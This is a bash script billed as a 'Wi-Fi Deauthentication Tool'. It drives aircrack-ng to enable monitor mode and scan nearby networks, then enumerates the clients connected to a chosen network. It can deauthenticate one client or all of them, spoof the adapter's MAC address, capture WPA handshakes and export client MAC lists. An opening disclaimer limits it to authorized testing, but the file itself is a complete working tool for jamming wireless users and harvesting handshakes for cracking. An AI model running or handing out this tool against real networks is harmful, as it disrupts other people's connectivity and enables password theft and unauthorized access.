#!/bin/bash

wifi_interface="wlan0"
declare -a networks_bssid
declare -a networks_channel
declare -a networks_ssid
declare -a clients_mac

selected_bssid=""
selected_channel=""
selected_ssid=""

display_menu() {
    echo "------------------------------------"
    echo "Wi-Fi Deauthentication Tool"
    echo "0. Enable Monitor Mode"
    echo "1. Scan for Wi-Fi networks"
    echo "2. Select a Wi-Fi network for further actions"
    echo "3. List connected clients to selected network"
    echo "4. Deauthenticate a client from a Wi-Fi network"
    echo "5. Deauthenticate all clients from a Wi-Fi network"
    echo "6. Check Wi-Fi Adapter Status"
    echo "7. Change Wi-Fi Adapter Interface Name"
    echo "8. Reset Wi-Fi Adapter mode"
    echo "9. Spoof MAC Address"
    echo "10. Capture WPA Handshake"
    echo "11. Cleanup Temporary Files"
    echo "12. Export Client MACs to File"
    echo "13. Exit"
    echo ""
    echo "Enter your choice:"
    read choice
}

enable_monitor_mode() {
    echo "Setting $wifi_interface to monitor mode..."
    sudo ifconfig "$wifi_interface" down
    sudo iwconfig "$wifi_interface" mode monitor
    sudo ifconfig "$wifi_interface" up
    echo "Monitor mode enabled."
}

spoof_mac() {
    echo "Spoofing MAC address for $wifi_interface..."
    sudo ifconfig "$wifi_interface" down
    sudo macchanger -r "$wifi_interface"
    sudo ifconfig "$wifi_interface" up
    echo "MAC address spoofed."
}

scan_wifi() {
    rm -f scan_results-01.csv
    echo "Scanning for Wi-Fi networks..."
    sudo timeout 10 airodump-ng --write scan_results --write-interval 1 --output-format csv "$wifi_interface" > /dev/null 2>&1
    
    if [[ ! -f scan_results-01.csv ]]; then
        echo "Scan failed."
        return
    fi
    
    networks_bssid=()
    networks_channel=()
    networks_ssid=()
    local parsing_ap=true
    local line_num=0

    while IFS= read -r line; do
        if [[ -z "$line" ]]; then
            parsing_ap=false
            continue
        fi
        
        if $parsing_ap; then
            if [[ $line_num -lt 2 ]]; then ((line_num++)); continue; fi
            IFS=',' read -r bssid _ _ channel _ _ _ _ _ _ _ _ _ essid _ <<< "$line"
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            essid=$(echo "$essid" | xargs)
            if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ $channel =~ ^[0-9]+$ ]]; then
                networks_bssid+=("$bssid")
                networks_channel+=("$channel")
                networks_ssid+=("$essid")
            fi
        fi
    done < scan_results-01.csv

    echo -e "\nFound Wi-Fi networks:"
    printf "%-4s %-20s %-20s %-10s\n" "No." "SSID" "BSSID" "Channel"
    for i in "${!networks_bssid[@]}"; do
        printf "%-4s %-20s %-20s %-10s\n" "$((i+1))" "${networks_ssid[i]:-<hidden>}" "${networks_bssid[i]}" "${networks_channel[i]}"
    done
}

select_wifi() {
    rm -f clients_scan-01.csv
    if [[ ${#networks_bssid[@]} -eq 0 ]]; then echo "Please scan first."; return; fi

    echo "Enter Wi-Fi network number:"
    read net_num
    if ! [[ "$net_num" =~ ^[0-9]+$ ]] || (( net_num < 1 || net_num > ${#networks_bssid[@]} )); then echo "Invalid."; return; fi

    selected_bssid=${networks_bssid[$((net_num-1))]}
    selected_channel=${networks_channel[$((net_num-1))]}
    selected_ssid=${networks_ssid[$((net_num-1))]}
    echo "Selected $selected_ssid ($selected_bssid) on channel $selected_channel"

    echo "Scanning for connected clients (10s)..."
    sudo timeout 10 airodump-ng --bssid "$selected_bssid" --channel "$selected_channel" --write clients_scan --write-interval 1 --output-format csv "$wifi_interface" > /dev/null 2>&1
    
    if [[ ! -f clients_scan-01.csv ]]; then echo "Client scan failed."; clients_mac=(); return; fi

	clients_mac=()
	local parsing_clients=false

	while IFS= read -r line; do
	    # Detect start of Station section
	    if [[ "$line" =~ ^Station\ MAC ]]; then
		parsing_clients=true
		continue
	    fi

	    if $parsing_clients; then
		# Ignore empty lines
		[[ -z "$line" ]] && continue

		IFS=',' read -r station_mac _ _ _ _ bssid _ <<< "$line"
		station_mac=$(echo "$station_mac" | xargs)
		bssid=$(echo "$bssid" | xargs)

		if [[ $bssid == "$selected_bssid" ]] && [[ $station_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
		    clients_mac+=("$station_mac")
		fi
	    fi
	done < clients_scan-01.csv

    echo "Found ${#clients_mac[@]} clients connected to $selected_ssid."
}

list_clients() {
    if [[ -z $selected_bssid ]]; then echo "Please select a network first."; return; fi
    if [[ ${#clients_mac[@]} -eq 0 ]]; then echo "No clients found. Re-scan network."; return; fi
    echo -e "\nClients on $selected_ssid:"
    printf "%-4s %-20s\n" "No." "Client MAC"
    for i in "${!clients_mac[@]}"; do
        printf "%-4s %-20s\n" "$((i+1))" "${clients_mac[i]}"
    done
}

deauth_client() {
    if [[ -z $selected_bssid ]]; then echo "No network selected."; return; fi
    if [[ ${#clients_mac[@]} -eq 0 ]]; then echo "No clients to deauth."; return; fi
    list_clients
    echo "Enter client number:"
    read client_num
    if ! [[ "$client_num" =~ ^[0-9]+$ ]] || (( client_num < 1 || client_num > ${#clients_mac[@]} )); then echo "Invalid."; return; fi
    client_mac=${clients_mac[$((client_num-1))]}
    echo "Packets to send:"
    read deauth_packets
    sudo aireplay-ng --deauth "$deauth_packets" -a "$selected_bssid" -c "$client_mac" "$wifi_interface"
}

deauth_all_clients() {
    if [[ -z $selected_bssid ]]; then echo "Select a network first."; return; fi
    echo "Packets to send:"
    read deauth_packets
    sudo aireplay-ng --deauth "$deauth_packets" -a "$selected_bssid" "$wifi_interface"
}

capture_handshake() {
    if [[ -z $selected_bssid ]]; then echo "Select a network first."; return; fi
    echo "Capturing WPA handshake. Press Ctrl+C to stop."
    sudo airodump-ng --bssid "$selected_bssid" --channel "$selected_channel" --write "handshake_capture" "$wifi_interface"
}

export_clients() {
    if [[ ${#clients_mac[@]} -eq 0 ]]; then echo "No clients to export."; return; fi
    file="clients_${selected_ssid// /_}.txt"
    for mac in "${clients_mac[@]}"; do
        echo "$mac" >> "$file"
    done
    echo "Exported to $file"
}

check_wifi() {
    echo "Wi-Fi Adapter Status:"
    iwconfig "$wifi_interface"
}

change_interface() {
    echo "New interface name:"
    read new_interface
    wifi_interface=$new_interface
    echo "Changed to $wifi_interface"
}

reset_interface() {
    echo "Resetting adapter to managed mode..."
    sudo service NetworkManager stop
    sudo ifconfig "$wifi_interface" down
    sudo iwconfig "$wifi_interface" mode managed
    sudo ifconfig "$wifi_interface" up
    sudo service NetworkManager restart
    echo "Managed mode set."
}

cleanup_temp() {
    echo "Cleaning temp files..."
    rm -f scan_results* clients_scan* handshake_capture* > /dev/null 2>&1
    echo "Temporary files cleaned."
}

# Disclaimer & Confirmation
echo ""
echo "DISCLAIMER:"
echo "This script is for educational and authorized penetration testing purposes only."
echo "You are solely responsible for how you use this tool."
echo "Misuse may be illegal and punishable by law."
echo "Developed and maintained by DevN1212"
echo ""
read -p "Press ENTER to continue if you agree to use this responsibly..."

# Main menu loop
while true; do
    display_menu

    case $choice in
        0)
            enable_monitor_mode
            ;;
        1)
            scan_wifi
            ;;
        2)
            select_wifi
            ;;
        3)
            list_clients
            ;;
        4)
            deauth_client
            ;;
        5)
            deauth_all_clients
            ;;
        6)
            check_wifi
            ;;
        7)
            change_interface
            ;;
        8)
            reset_interface
            ;;
        9)
            spoof_mac
            ;;
        10)
            capture_handshake
            ;;
        11)
            cleanup_temp
            ;;
        12)
            export_clients
            ;;
        13)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid choice. Try again."
            ;;
    esac

    echo ""
done
